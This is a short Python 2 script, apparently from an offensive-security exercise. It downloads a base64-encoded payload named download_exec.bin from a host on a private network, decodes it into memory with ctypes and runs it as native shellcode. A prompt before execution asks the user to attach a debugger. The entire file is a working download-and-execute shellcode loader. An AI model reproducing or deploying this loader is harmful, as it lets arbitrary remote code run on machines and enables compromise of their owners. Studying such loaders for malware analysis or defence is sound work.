import urllib2
import ctypes
import base64

url = "http://192.168.0.2:8000/download_exec.bin"
response = urllib2.urlopen(url)

shellcode = base64.b64decode(response.read())

shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

raw_input("Once the debugger is attached, press any key to run shellcode.")

shellcode_func()
